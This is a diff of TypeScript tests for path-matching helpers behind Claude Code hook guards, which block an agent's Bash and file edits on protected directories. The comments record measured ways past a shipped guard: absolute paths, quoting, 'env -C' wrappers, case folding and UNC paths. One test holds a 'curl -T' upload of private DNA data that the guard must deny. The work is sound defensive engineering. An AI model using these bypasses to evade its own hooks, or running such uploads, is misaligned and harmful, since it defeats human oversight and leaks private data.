@@ -46,6 +46,9 @@ import {
   responseView,
   isStampRepairEvent,
   isLoadPathRepairEvent,
+  pathView,
+  projectRootOf,
+  undecidablePathWarning,
 } from "./hook-program.js";
 import { provide, dangerously, provider } from "./hook-providers.js";
 import { codexDialect } from "../adapters/codex/dialect.js";
@@ -175,6 +178,210 @@ test("commandView.touches/pipesToShell: high-signal secret-read + curl|sh matche
   // A shell WITH a script file is a normal invocation — NOT flagged.
   assert.equal(commandView("sh deploy.sh").pipesToShell(), false);
   assert.equal(commandView("git status").pipesToShell(), false);
+});
+
+// ---------------------------------------------------------------------------
+// touches()/writesTo() are DENYLISTS, so a miss is an ALLOW — the root-blindness
+// that costs `under` silence costs these two a bypass.
+//
+// MEASURED 2026-08-12 against a real shipped guard (`paper-edit-guard.hook.ts`,
+// `CLAUDE_PROJECT_DIR` set, exit 2 = blocked, 0 = allowed):
+//
+//   sed -i s/a/b/ migratsiya/papers/x/paper.tex                  → 2  blocked
+//   sed -i s/a/b/ /home/user/mine/migratsiya/papers/x/paper.tex  → 0  ALLOWED
+//   cp /tmp/a     migratsiya/papers/x/paper.tex                  → 2  blocked
+//   cp /tmp/a     /home/user/mine/migratsiya/papers/x/paper.tex  → 0  ALLOWED
+//
+// The old `tokenUnder` suffix-matched with `endsWith("/" + prefix)`, which is
+// true only when a path ENDS AT the prefix — never for a file UNDER it. So any
+// gate written with a repo-relative prefix was bypassable by spelling the path
+// absolutely, and the two guards that were NOT bypassable were the two whose
+// authors had hand-rolled the missing bias themselves.
+// ---------------------------------------------------------------------------
+const MINE_ROOT = "/home/user/mine";
+const PAPER_DIR = ["migratsiya/papers"];
+
+test("touches: the ABSOLUTE spelling no longer walks past a relative prefix", () => {
+  // The measured bypass, with and without a resolvable root.
+  for (const cmd of [
+    "sed -i s/a/b/ /home/user/mine/migratsiya/papers/x/paper.tex",
+    "cp /tmp/a /home/user/mine/migratsiya/papers/x/paper.tex",
+  ]) {
+    // WITH a root the path is PLACED: provably this repo's paper directory.
+    assert.equal(commandView(cmd, MINE_ROOT).touches(PAPER_DIR), true, cmd);
+    // WITHOUT one it is UNDECIDABLE — and a denylist breaks that toward a match,
+    // so the gate still blocks. The root buys precision, not the fix.
+    assert.equal(commandView(cmd).touches(PAPER_DIR), true, cmd);
+  }
+  // The relative spelling, which always worked, still does.
+  assert.equal(
+    commandView(
+      "sed -i s/a/b/ migratsiya/papers/x/paper.tex",
+      MINE_ROOT,
+    ).touches(PAPER_DIR),
+    true,
+  );
+});
+
+test("touches: over-blocking is BOUNDED — an unrelated command is still a miss", () => {
+  // A check that always fires carries no information. `undecidable` is gated on
+  // the prefix's segments actually occurring in the token, so ordinary work is
+  // untouched with or without a root.
+  for (const root of [MINE_ROOT, undefined]) {
+    assert.equal(commandView("git status", root).touches(PAPER_DIR), false);
+    assert.equal(commandView("cat README.md", root).touches(PAPER_DIR), false);
+    assert.equal(
+      commandView("cp /tmp/a /home/user/mine/src/x.ts", root).touches(
+        PAPER_DIR,
+      ),
+      false,
+    );
+    // Same repo, adjacent directory — the near miss a sloppy `includes` would
+    // swallow.
+    assert.equal(
+      commandView(
+        "sed -i s/a/b/ /home/user/mine/migratsiya/README.md",
+        root,
+      ).touches(PAPER_DIR),
+      false,
+    );
+  }
+});
+
+test("touches vs under: ONE rule, OPPOSITE biases, on the same input", () => {
+  // A sibling checkout's copy of the same relative path. Neither primitive can
+  // place it inside THIS repo, and they must disagree about what to do with that:
+  // the allowlist stays quiet, the denylist blocks.
+  const foreign = "/somewhere/else/migratsiya/papers/x/paper.tex";
+  assert.equal(pathView(foreign, MINE_ROOT).under(PAPER_DIR), false);
+  assert.equal(
+    commandView(`sed -i s/a/b/ ${foreign}`, MINE_ROOT).touches(PAPER_DIR),
+    true,
+  );
+  // And with no root at all, where nothing can be placed.
+  assert.equal(pathView(foreign).under(PAPER_DIR), false);
+  assert.equal(
+    commandView(`sed -i s/a/b/ ${foreign}`).touches(PAPER_DIR),
+    true,
+  );
+});
+
+test("under is UNCHANGED by the shared rule — the allowlist keeps its bias", () => {
+  // Regression guard: `under` accepts the "under" verdict only, so widening the
+  // undecidable bucket for the denylists cannot leak a grant into it.
+  assert.equal(
+    pathView("/home/user/mine/src/x.ts", MINE_ROOT).under(["src"]),
+    true,
+  );
+  assert.equal(pathView("src/x.ts").under(["src"]), true);
+  assert.equal(pathView("/home/user/mine/src/x.ts").under(["src"]), false);
+  assert.equal(pathView("/etc/passwd", MINE_ROOT).under(["etc"]), false);
+  assert.equal(pathView("/etc/passwd", MINE_ROOT).under(["/etc"]), true);
+  // A path INSIDE the root but not under the prefix, whose name nonetheless
+  // contains the prefix's segments — `undecidable` for a denylist, still a flat
+  // miss here.
+  assert.equal(
+    pathView("/home/user/mine/vendor/src/x.ts", MINE_ROOT).under(["src"]),
+    false,
+  );
+  assert.equal(
+    commandView("cat /home/user/mine/vendor/src/x.ts", MINE_ROOT).touches([
+      "src",
+    ]),
+    true,
+  );
+});
+
+test("writesTo: the same denylist bias, because it has the same job", () => {
+  const abs = "/home/user/mine/migratsiya/papers/x/paper.tex";
+  assert.equal(
+    commandView(`echo x > ${abs}`, MINE_ROOT).writesTo(PAPER_DIR),
+    true,
+  );
+  assert.equal(
+    commandView(`sed -i s/a/b/ ${abs}`, MINE_ROOT).writesTo(PAPER_DIR),
+    true,
+  );
+  assert.equal(commandView(`echo x > ${abs}`).writesTo(PAPER_DIR), true);
+  // Still a WRITE matcher: reading the same absolute path is not one.
+  assert.equal(commandView(`cat ${abs}`, MINE_ROOT).writesTo(PAPER_DIR), false);
+  // Still not a guess: an unresolvable target matches nothing.
+  assert.equal(
+    commandView('echo x > "$OUT"', MINE_ROOT).writesTo(PAPER_DIR),
+    false,
+  );
+});
+
+test("touches: a TRAILING SLASH in the prefix no longer matches nothing", () => {
+  // `tokenUnder` tested `startsWith(prefix + "/")`, so "papers/" became
+  // "papers//" and a guard written that way silently matched NOTHING — a trap
+  // recorded in a shipped guard's own header after it shipped.
+  assert.equal(commandView("cat papers/x/paper.md").touches(["papers/"]), true);
+  assert.equal(
+    commandView("cat papers/x/paper.md").touches(["papers/**"]),
+    true,
+  );
+  assert.equal(commandView("cat other/x.md").touches(["papers/"]), false);
+});
+
+test("decideProgram threads the root, so a gate sees both spellings alike", () => {
+  // The end-to-end shape the CLI runs: the payload carries `cwd` (Claude Code
+  // sends it on every hook event) and no explicit root is passed.
+  const paperGuard = defineHook({
+    on: "PreToolUse",
+    match: tool("Bash"),
+    decide: (e) =>
+      e.command.touches(PAPER_DIR) ? deny("paper write from Bash") : allow(),
+  });
+  const bash = (command: string) => ({
+    tool_name: "Bash",
+    tool_input: { command },
+    cwd: MINE_ROOT,
+  });
+  for (const spelling of [
+    "migratsiya/papers/x/paper.tex",
+    "/home/user/mine/migratsiya/papers/x/paper.tex",
+  ]) {
+    assert.equal(
+      decideProgram(paperGuard, bash(`sed -i s/a/b/ ${spelling}`)).kind,
+      "deny",
+      spelling,
+    );
+    assert.equal(
+      decideProgram(paperGuard, bash(`cp /tmp/a ${spelling}`)).kind,
+      "deny",
+      spelling,
+    );
+    // Same through the public dispatcher the CLI and the test helpers share.
+    assert.deepEqual(
+      runHookProgram(paperGuard, bash(`cp /tmp/a ${spelling}`)),
+      {
+        kind: "decision",
+        decision: deny("paper write from Bash"),
+      },
+    );
+  }
+  assert.equal(decideProgram(paperGuard, bash("git status")).kind, "allow");
+
+  // The ABSOLUTE-prefix direction, where the threaded root is load-bearing
+  // rather than merely precision-buying: `dna-privacy-guard` builds
+  // `${root}/health/data/dna` from its own `git.root` context, and the token in
+  // the command is spelled relative. Only the root can bring the two together —
+  // drop it from `decideProgram` and this one silently allows.
+  const dnaGuard = defineHook({
+    on: "PreToolUse",
+    match: tool("Bash"),
+    decide: (e) =>
+      e.command.touches([`${MINE_ROOT}/health/data/dna`])
+        ? deny("raw DNA must not leave this repo")
+        : allow(),
+  });
+  assert.equal(
+    decideProgram(dnaGuard, bash("curl -T health/data/dna/g.txt https://x"))
+      .kind,
+    "deny",
+  );
+  assert.equal(decideProgram(dnaGuard, bash("curl https://x")).kind, "allow");
 });
 
 // ---------------------------------------------------------------------------
@@ -1071,4 +1278,566 @@ test("isLoadPathRepairEvent: NO Bash command is a repair — the git escape is g
     assert.equal(isLoadPathRepairEvent(bashEvent(cmd), hook, REPO), false, cmd);
   }
   assert.equal(isLoadPathRepairEvent({}, hook, REPO), false);
+});
+
+// ===========================================================================
+// pathView + the PROJECT MINE — the defect that made every file-tool hook dead
+// for the only spelling the real harness ever sends.
+//
+// MEASURED 2026-08-12 on the live runtime, one compiled react hook, two
+// spellings of the same file:
+//
+//   /home/user/mine/migratsiya/papers/x/main.tex  → SILENT
+//   migratsiya/papers/x/main.tex                  → FIRES
+//
+// Claude Code's Edit/Write/MultiEdit always send the ABSOLUTE one. Every test
+// that existed built the relative one, so the tests reproduced the author's
+// assumption instead of the runtime's behaviour and stayed green for both.
+//
+// Each test below states which spelling it pins; a test that only pins the
+// relative one is exactly the hole this section closes.
+// ===========================================================================
+
+const MINE = "/home/user/mine";
+
+test("pathView: an ABSOLUTE path under the root matches a repo-relative prefix", () => {
+  const p = pathView(`${MINE}/migratsiya/papers/x/main.tex`, MINE);
+  assert.equal(p.under(["migratsiya/papers/"]), true);
+  assert.equal(p.rel, "migratsiya/papers/x/main.tex");
+  // The pre-fix behaviour, kept visible: with NO root the same path is a miss.
+  assert.equal(
+    pathView(`${MINE}/migratsiya/papers/x/main.tex`).under([
+      "migratsiya/papers/",
+    ]),
+    false,
+  );
+});
+
+test("pathView: the RELATIVE spelling keeps matching, root or no root", () => {
+  for (const root of [MINE, undefined]) {
+    const p = pathView("migratsiya/papers/x/main.tex", root);
+    assert.equal(p.under(["migratsiya/papers/"]), true, `root=${String(root)}`);
+    assert.equal(p.under(["./migratsiya/papers"]), false); // a prefix is not a path
+    assert.equal(p.under(["health"]), false);
+  }
+  // `./` on the PATH is stripped in both modes.
+  assert.equal(pathView("./src/x.ts").under(["src"]), true);
+  assert.equal(pathView("./src/x.ts", MINE).under(["src"]), true);
+});
+
+test("pathView: a SIBLING checkout never matches — the resolveRef lesson, again", () => {
+  // Same tail, different repo. A suffix comparison would hand this a grant
+  // meant for THIS repo; `resolveRef` already paid for that hole once.
+  const other = pathView("/home/user/other/migratsiya/papers/x/main.tex", MINE);
+  assert.equal(other.under(["migratsiya/papers/"]), false);
+  assert.equal(other.rel, undefined);
+  // And a path outside the root entirely.
+  const outside = pathView("/etc/passwd", MINE);
+  assert.equal(outside.under(["etc"]), false);
+  assert.equal(outside.rel, undefined);
+});
+
+test("pathView: an ABSOLUTE prefix matches the absolute path — in BOTH spellings", () => {
+  assert.equal(pathView("/etc/passwd").under(["/etc"]), true); // no root needed
+  assert.equal(pathView("/etc/passwd", MINE).under(["/etc"]), true);
+  // With a root, a relative PATH resolves and can match an absolute PREFIX.
+  assert.equal(
+    pathView("migratsiya/x.md", MINE).under([`${MINE}/migratsiya`]),
+    true,
+  );
+  assert.equal(
+    pathView("migratsiya/x.md").under([`${MINE}/migratsiya`]),
+    false,
+  );
+});
+
+test("pathView: prefix spellings — trailing slash, glob tail, catch-all", () => {
+  const p = pathView(`${MINE}/src/x.ts`, MINE);
+  for (const prefix of ["src", "src/", "src/**", "src/*"]) {
+    assert.equal(p.under([prefix]), true, prefix);
+  }
+  assert.equal(p.under(["srcery"]), false); // boundary-aware, not startsWith
+  assert.equal(p.under(["/"]), true); // the catch-all
+  assert.equal(p.under(["**"]), true);
+  assert.equal(p.under([]), false);
+});
+
+test("pathView: dot segments and a root with a trailing slash normalize", () => {
+  assert.equal(
+    pathView(`${MINE}/migratsiya/./papers/x.tex`, `${MINE}/`).under([
+      "migratsiya/papers",
+    ]),
+    true,
+  );
+  assert.equal(
+    pathView(`${MINE}/migratsiya/../health/x.md`, MINE).under(["migratsiya"]),
+    false,
+  );
+  // The root itself is `""` relative — under a catch-all, under nothing named.
+  assert.equal(pathView(MINE, MINE).rel, "");
+});
+
+test("pathView: a RELATIVE root is no root — it must not turn /etc/passwd into etc/passwd", () => {
+  // `resolveRef(".", ".")` collapses to `""`, so a naive implementation strips
+  // the leading slash and reports an absolute system path as repo-relative — a
+  // FALSE GRANT for a confinement gate, on an input Claude Code never sends but
+  // a test or a hand-rolled runner easily can.
+  for (const root of [".", "", "repo", "./repo"]) {
+    const p = pathView("/etc/passwd", root);
+    assert.equal(p.rel, undefined, `root=${JSON.stringify(root)}`);
+    assert.equal(p.under(["etc"]), false, `root=${JSON.stringify(root)}`);
+    assert.equal(p.under(["/etc"]), true); // the absolute prefix still works
+  }
+  // A relative PATH with a relative root keeps behaving as if there were none.
+  assert.equal(pathView("src/x.ts", ".").under(["src"]), true);
+});
+
+test("pathView: a Windows drive root relates the two spellings the same way", () => {
+  const p = pathView("C:/repo/src/x.ts", "C:/repo");
+  assert.equal(p.rel, "src/x.ts");
+  assert.equal(p.under(["src"]), true);
+  assert.equal(pathView("C:\\repo\\src\\x.ts", "C:/repo").under(["src"]), true);
+  assert.equal(pathView("C:/other/src/x.ts", "C:/repo").under(["src"]), false);
+});
+
+test("projectRootOf: $CLAUDE_PROJECT_DIR wins, the event's cwd is the fallback, cwd() is never asked", () => {
+  assert.equal(
+    projectRootOf({ cwd: "/from/event" }, { CLAUDE_PROJECT_DIR: "/from/env" }),
+    "/from/env",
+  );
+  assert.equal(projectRootOf({ cwd: "/from/event" }, {}), "/from/event");
+  assert.equal(projectRootOf({}, {}), undefined);
+  // Blank is not a root — an unset var that expanded to "" must not win.
+  assert.equal(
+    projectRootOf({ cwd: "/from/event" }, { CLAUDE_PROJECT_DIR: "  " }),
+    "/from/event",
+  );
+  assert.equal(projectRootOf({ cwd: 42 }, {}), undefined); // not a string
+  // The default env is EMPTY, not process.env — core reads no environment.
+  assert.equal(projectRootOf({}), undefined);
+});
+
+test("undecidablePathWarning: loud for the one case that decides on nothing, silent otherwise", () => {
+  assert.match(
+    undecidablePathWarning("/home/user/mine/x.md", undefined) ?? "",
+    /no project root/,
+  );
+  assert.equal(undecidablePathWarning("/home/user/mine/x.md", MINE), undefined);
+  // A RELATIVE path is decidable without a root — warning here would read as a
+  // react hook's notice (both go to stderr) and make every silent hook look live.
+  assert.equal(undecidablePathWarning("migratsiya/x.md", undefined), undefined);
+  assert.equal(undecidablePathWarning(undefined, undefined), undefined);
+});
+
+// --- the two decode doors, each with the absolute spelling ------------------
+
+const paperNudge = defineReact({
+  on: "PostToolUse",
+  match: tools("Edit", "Write"),
+  react: (e) =>
+    e.path.under(["migratsiya/papers/"]) ? notice("checklist") : nothing(),
+});
+
+const confineToSrc = defineFileGate({
+  on: "PreToolUse",
+  match: tools("Edit", "Write"),
+  decide: (e) => (e.path.under(["src"]) ? allow() : deny("confined to src/")),
+});
+
+test("runReact: an ABSOLUTE file_path fires the react — via the root arg AND via the payload's cwd", () => {
+  const abs = {
+    tool_name: "Edit",
+    tool_input: { file_path: `${MINE}/migratsiya/papers/x/main.tex` },
+  };
+  assert.equal(runReact(paperNudge, abs, MINE).kind, "notice");
+  assert.equal(runReact(paperNudge, { ...abs, cwd: MINE }).kind, "notice");
+  // No root anywhere → silence, never a false fire.
+  assert.equal(runReact(paperNudge, abs).kind, "none");
+  // A sibling checkout is not this repo, however alike the tail looks.
+  assert.equal(
+    runReact(
+      paperNudge,
+      {
+        ...abs,
+        tool_input: {
+          file_path: "/home/user/other/migratsiya/papers/x/main.tex",
+        },
+      },
+      MINE,
+    ).kind,
+    "none",
+  );
+});
+
+test("decideFileGate: an ABSOLUTE file_path inside the confinement is ALLOWED (it used to be denied)", () => {
+  const inside = {
+    tool_name: "Write",
+    tool_input: { file_path: `${MINE}/src/x.ts` },
+  };
+  assert.equal(decideFileGate(confineToSrc, inside, {}, MINE).kind, "allow");
+  assert.equal(
+    decideFileGate(confineToSrc, { ...inside, cwd: MINE }).kind,
+    "allow",
+  );
+  // …and everything outside still denies, which is the direction a miss must
+  // take for an allowlist gate: unprovable → deny, never a false grant.
+  for (const fp of [
+    `${MINE}/dist/x.js`,
+    "/etc/passwd",
+    "/home/user/other/src/x.ts",
+  ]) {
+    assert.equal(
+      decideFileGate(
+        confineToSrc,
+        { tool_name: "Write", tool_input: { file_path: fp } },
+        {},
+        MINE,
+      ).kind,
+      "deny",
+      fp,
+    );
+  }
+});
+
+test("runHookProgram: the dispatcher threads the root to both file roles", () => {
+  const abs = `${MINE}/migratsiya/papers/x/main.tex`;
+  const viaArg = runHookProgram(
+    paperNudge,
+    { tool_name: "Edit", tool_input: { file_path: abs } },
+    {},
+    MINE,
+  );
+  assert.equal(viaArg.kind === "reaction" && viaArg.reaction.kind, "notice");
+  const viaCwd = runHookProgram(paperNudge, {
+    tool_name: "Edit",
+    tool_input: { file_path: abs },
+    cwd: MINE,
+  });
+  assert.equal(viaCwd.kind === "reaction" && viaCwd.reaction.kind, "notice");
+  const gate = runHookProgram(
+    confineToSrc,
+    { tool_name: "Write", tool_input: { file_path: `${MINE}/src/x.ts` } },
+    {},
+    MINE,
+  );
+  assert.equal(gate.kind === "decision" && gate.decision.kind, "allow");
+});
+
+// ---------------------------------------------------------------------------
+// Round 29: the SAME carve-out, one layer up. Round 28 kept `/` and `C:/` alive
+// as a project ROOT and left the PREFIX normaliser stripping them — so an
+// allowlist prefix of `C:/` became `C:`, which `isAbsoluteRef` reads as
+// relative, and every path fell outside it. A confinement gate that denies
+// everything and a react hook that never fires both look like decisions.
+// ---------------------------------------------------------------------------
+test("under: a drive-root prefix still matches (the separator IS the path)", () => {
+  assert.equal(pathView("C:/repo/x", "C:/repo").under(["C:/"]), true);
+  assert.equal(pathView("C:/repo/x", "C:/repo").under(["C:\\"]), true);
+  // and the POSIX twin
+  assert.equal(pathView("/repo/x", "/repo").under(["/"]), true);
+});
+
+test("under: a drive root does not swallow a DIFFERENT drive", () => {
+  assert.equal(pathView("D:/repo/x", "D:/repo").under(["C:/"]), false);
+});
+
+test("under: an ordinary trailing slash is still trimmed", () => {
+  assert.equal(pathView("/repo/src/a.ts", "/repo").under(["src/"]), true);
+  assert.equal(pathView("/repo/src/a.ts", "/repo").under(["src"]), true);
+  assert.equal(pathView("/repo/srcx/a.ts", "/repo").under(["src"]), false);
+});
+
+// ---------------------------------------------------------------------------
+// Round 30: the catch-all is a SENTINEL, not a root. Round 29's carve-out
+// turned `normalizePrefix("**")` from `""` into `"/"`, so a catch-all started
+// demanding an absolute spelling and denied every relative path with no root.
+// The drive-root test written in the same commit did not catch it — it supplied
+// a root. These cases supply none, which is the whole point.
+// ---------------------------------------------------------------------------
+test("under: a catch-all matches a RELATIVE path with no root", () => {
+  for (const prefix of ["**", "*", "/"]) {
+    assert.equal(
+      pathView("src/x.ts").under([prefix]),
+      true,
+      `${prefix} must match a relative path with no root`,
+    );
+    assert.equal(
+      pathView("anything/at/all.md").under([prefix]),
+      true,
+      `${prefix} must match ANY relative path with no root`,
+    );
+  }
+  // A non-catch-all prefix is unaffected: still matched on its own terms.
+  assert.equal(pathView("src/x.ts").under(["src/**"]), true);
+  assert.equal(pathView("other/x.ts").under(["src/**"]), false);
+});
+
+test("under: a catch-all still matches when a root IS known", () => {
+  assert.equal(pathView("/repo/src/x.ts", "/repo").under(["**"]), true);
+  assert.equal(pathView("C:/repo/x", "C:/repo").under(["**"]), true);
+});
+
+test("under: a drive root is NOT a catch-all — a different drive stays outside", () => {
+  assert.equal(pathView("D:/repo/x", "D:/repo").under(["C:/"]), false);
+});
+
+// ---------------------------------------------------------------------------
+// Round 31: Windows filesystems are case-insensitive, POSIX ones are not.
+// Folding everywhere would turn a silent miss into a silent FALSE GRANT on
+// Linux, where /repo/Secrets and /repo/secrets are two different files. So the
+// fold is drive-rooted-only, and both halves are pinned here.
+// ---------------------------------------------------------------------------
+test("under: a drive-rooted path matches its root case-insensitively", () => {
+  assert.equal(pathView("c:/repo/src/x.ts", "C:/Repo").under(["src"]), true);
+  assert.equal(pathView("C:/REPO/src/x.ts", "c:/repo").under(["src"]), true);
+});
+
+test("under: POSIX stays case-SENSITIVE — folding there would invent a match", () => {
+  // The load-bearing case is whether the path is judged INSIDE THE ROOT at all.
+  // On Linux `/REPO` and `/repo` are two different directories, so a file in one
+  // is not in the other. Fold here and an allowlist gate would accept a path
+  // from a DIFFERENT tree — a false grant, the direction we never take.
+  assert.equal(pathView("/repo/src/x.ts", "/REPO").under(["src"]), false);
+  assert.equal(pathView("/repo/src/x.ts", "/repo").under(["src"]), true);
+  // A weaker sibling: prefix comparison keeps the path's own casing either way.
+  assert.equal(pathView("/repo/Secrets/x", "/repo").under(["secrets"]), false);
+});
+
+// ---------------------------------------------------------------------------
+// Round 32: the fold reached the repo-relative branch and not the ABSOLUTE one,
+// nor `mightBeUnder`. For a denylist caller (`writesTo`) that miss ALLOWS a
+// write to a protected path — the failure direction this PR exists to remove.
+// The fix moved the rule into the comparator, so these cover both branches and
+// the fallback at once.
+// ---------------------------------------------------------------------------
+test("under: an ABSOLUTE drive-rooted prefix folds case too", () => {
+  assert.equal(
+    pathView("c:/repo/secrets/x", "C:/repo").under(["C:/Repo/Secrets"]),
+    true,
+  );
+  assert.equal(
+    pathView("C:/REPO/SECRETS/x", "c:/repo").under(["c:/repo/secrets"]),
+    true,
+  );
+});
+
+test("under: an absolute POSIX prefix stays case-SENSITIVE", () => {
+  assert.equal(
+    pathView("/repo/secrets/x", "/repo").under(["/repo/Secrets"]),
+    false,
+  );
+  assert.equal(
+    pathView("/repo/secrets/x", "/repo").under(["/repo/secrets"]),
+    true,
+  );
+});
+
+test("touches: the denylist fallback folds on a drive-rooted prefix", () => {
+  // No root known — the answer must be `undecidable`, which a denylist reads as
+  // a match. Case-sensitive, this missed and the write went through.
+  const v = commandView('cp /tmp/a "C:/Repo/Secrets/x.txt"');
+  assert.equal(v.touches(["C:/repo/secrets"]), true);
+});
+
+// ---------------------------------------------------------------------------
+// A quoted path used to walk straight through every denylist built on
+// `touches`. Found while writing the round-32 case above, then MEASURED
+// end-to-end on a shipped guard: the unquoted spelling exited 2 (blocked), the
+// quoted one exited 0. Quoting is not an evasion technique — it is what anyone
+// writes for a path with a space — so the gate was one quote from open.
+// `writesTo` was already right because it reads the normalized argv; `touches`
+// read the raw one. Both read the same argv now.
+// ---------------------------------------------------------------------------
+test("touches: a QUOTED path does not walk through the denylist", () => {
+  for (const cmd of [
+    'cp /tmp/a "papers/x.tex"',
+    "cp /tmp/a 'papers/x.tex'",
+    'sed -i s/a/b/ "papers/x.tex"',
+    "cp /tmp/a papers/x.tex",
+  ]) {
+    assert.equal(commandView(cmd).touches(["papers"]), true, cmd);
+  }
+});
+
+test("touches: quoting does not make an unrelated path match either", () => {
+  assert.equal(
+    commandView('cp /tmp/a "other/x.tex"').touches(["papers"]),
+    false,
+  );
+  assert.equal(commandView("cp /tmp/a other/x.tex").touches(["papers"]), false);
+});
+
+// ---------------------------------------------------------------------------
+// P1, round 33 — and it was MY regression: switching `touches` to the normalized
+// argv fixed quoted paths and broke wrapper-consumed ones, because
+// `stripWrappers` CONSUMES the option and its value. `env -C secrets cat key`
+// still reads `secrets/key`, so a denylist on `secrets` failed open. Reading one
+// argv trades one bypass for the other; the union reads both.
+// ---------------------------------------------------------------------------
+test("touches: a WRAPPER-consumed path is still seen", () => {
+  assert.equal(
+    commandView("env -C secrets cat key").touches(["secrets"]),
+    true,
+  );
+  assert.equal(
+    commandView("env --chdir=secrets cat key").touches(["secrets"]),
+    true,
+  );
+});
+
+test("touches: both halves of the union hold at once", () => {
+  // quoted (needs normalized) and wrapper-consumed (needs raw), one command
+  assert.equal(
+    commandView('env -C secrets cat "key/x.txt"').touches(["secrets"]),
+    true,
+  );
+});
+
+test("touches: an option VALUE that is not a path still does not match", () => {
+  assert.equal(
+    commandView("grep --color=always x file").touches(["papers"]),
+    false,
+  );
+  assert.equal(commandView("cp /tmp/a other/x").touches(["papers"]), false);
+});
+
+// ---------------------------------------------------------------------------
+// P1, round 34: case-insensitivity belongs to the FILESYSTEM, so it is decided
+// by the ROOT. Keyed on the operand, a repo-relative prefix (`secrets`) looked
+// case-sensitive even under a Windows root, so `C:/REPO/SECRETS/x` vs `secrets`
+// compared exactly and a denylist allowed the protected write.
+// ---------------------------------------------------------------------------
+test("a Windows ROOT folds a repo-RELATIVE prefix too", () => {
+  assert.equal(
+    pathView("C:/REPO/SECRETS/x", "C:/repo").under(["secrets"]),
+    true,
+  );
+  assert.equal(
+    commandView("sed -i s/a/b/ C:/REPO/SECRETS/x", "C:/repo").writesTo([
+      "secrets",
+    ]),
+    true,
+  );
+  assert.equal(
+    commandView("sed -i s/a/b/ C:/REPO/SECRETS/x", "C:/repo").touches([
+      "secrets",
+    ]),
+    true,
+  );
+});
+
+test("a POSIX root does NOT fold a repo-relative prefix", () => {
+  assert.equal(pathView("/repo/SECRETS/x", "/repo").under(["secrets"]), false);
+  assert.equal(pathView("/repo/secrets/x", "/repo").under(["secrets"]), true);
+});
+
+test("folding never invents a match under a Windows root", () => {
+  assert.equal(
+    pathView("C:/repo/other/x", "C:/repo").under(["secrets"]),
+    false,
+  );
+});
+
+// ---------------------------------------------------------------------------
+// P1, round 35: a UNC share (`//server/share/repo`) is a Windows root and is
+// case-insensitive, but the predicate recognised only drive letters — so under
+// a UNC project root, `//server/share/repo/SECRETS/x` compared exactly against
+// `secrets` and a denylist allowed the protected write.
+//
+// ⚠️ WHAT THIS DOES *NOT* CLAIM, measured while writing it: `relativeToRoot`
+// still cannot RESOLVE a UNC path, so the allowlist side (`under`) answers false
+// rather than resolving the remainder. For an allowlist that is silence — the
+// safe direction — and it is asserted below so the limit is visible instead of
+// being mistaken for support.
+// ---------------------------------------------------------------------------
+test("a UNC root folds case for the DENYLIST side", () => {
+  const unc = "//Server/Share/Repo";
+  const cmd = "sed -i s/a/b/ //server/share/repo/SECRETS/x";
+  assert.equal(commandView(cmd, unc).writesTo(["secrets"]), true);
+  assert.equal(commandView(cmd, unc).touches(["secrets"]), true);
+  assert.equal(
+    commandView(
+      String.raw`sed -i s/a/b/ \\SERVER\SHARE\repo\SECRETS\x`,
+      String.raw`\\server\share\repo`,
+    ).writesTo(["secrets"]),
+    true,
+  );
+});
+
+test("folding under a UNC root does not invent a match", () => {
+  const unc = "//Server/Share/Repo";
+  assert.equal(
+    commandView("sed -i s/a/b/ //server/share/repo/other/x", unc).writesTo([
+      "secrets",
+    ]),
+    false,
+  );
+  assert.equal(
+    commandView("sed -i s/a/b/ /repo/SECRETS/x", "/repo").writesTo(["secrets"]),
+    false,
+  );
+});
+
+// ✅ Round 36 CLOSED the limit named above: `resolveRef` was collapsing the UNC
+// leader `//` to `/` while `normalizePrefix` kept the pair, so the two disagreed
+// on the same string and a UNC path never matched a UNC prefix — an allowlist
+// gate denying every valid edit on a network share. Both spellings now resolve.
+test("a UNC path RESOLVES, so the allowlist can match it", () => {
+  // ⚠️ WITH A ROOT. Absent one, `//a/b/c` is genuinely ambiguous — a UNC share on
+  // Windows, a harmless double slash on Linux — and no amount of string-reading
+  // settles it. The tie is broken toward POSIX because that is the platform this
+  // runs on, and because a real hook payload always carries `cwd`. Both readings
+  // fail toward SILENCE for an allowlist, so the cost of guessing wrong is a
+  // quiet miss, never a grant. The next case pins the POSIX half.
+  assert.equal(
+    pathView("//server/share/repo/src/x.ts", "//server/share/repo").under([
+      "//server/share/repo/src",
+    ]),
+    true,
+  );
+  assert.equal(
+    pathView("//server/share/repo/other/x", "//server/share/repo").under([
+      "//server/share/repo/src",
+    ]),
+    false,
+  );
+});
+
+test("preserving the UNC leader leaves POSIX resolution untouched", () => {
+  assert.equal(pathView("/repo/src/x", "/repo").under(["src"]), true);
+  assert.equal(pathView("/repo/src/x", "/repo").under(["/repo/src"]), true);
+  assert.equal(pathView("/repo/other/x", "/repo").under(["/repo/src"]), false);
+  // Round 37: keeping the pair unconditionally broke exactly this — on Linux a
+  // doubled slash is a stutter, not a share, and the path stopped resolving
+  // against a POSIX root. The ROOT decides, as it does for the case fold.
+  assert.equal(pathView("//repo/src/x.ts", "/repo").under(["src"]), true);
+  assert.equal(pathView("//repo/src/x.ts").under(["/repo/src"]), true);
+});
+
+// ---------------------------------------------------------------------------
+// Round 38: a relative `$CLAUDE_PROJECT_DIR` is not a root, so it must not
+// consume the slot. Returning it anyway masked a usable absolute `cwd` from the
+// payload — absolute paths stopped matching repo-relative prefixes AND the
+// diagnostic went quiet, because a root was "defined". Platform-neutral: this
+// bites on Linux exactly as hard.
+// ---------------------------------------------------------------------------
+test("projectRootOf: a RELATIVE env root falls through to the payload cwd", () => {
+  const ev = { cwd: "/home/u/repo" };
+  assert.equal(projectRootOf(ev, { CLAUDE_PROJECT_DIR: "." }), "/home/u/repo");
+  assert.equal(
+    projectRootOf(ev, { CLAUDE_PROJECT_DIR: "../up" }),
+    "/home/u/repo",
+  );
+  assert.equal(projectRootOf(ev, { CLAUDE_PROJECT_DIR: "" }), "/home/u/repo");
+});
+
+test("projectRootOf: an ABSOLUTE env root still wins, and unusable pairs give none", () => {
+  assert.equal(
+    projectRootOf({ cwd: "/payload" }, { CLAUDE_PROJECT_DIR: "/env" }),
+    "/env",
+  );
+  assert.equal(
+    projectRootOf({ cwd: "also/relative" }, { CLAUDE_PROJECT_DIR: "." }),
+    undefined,
+  );
 });
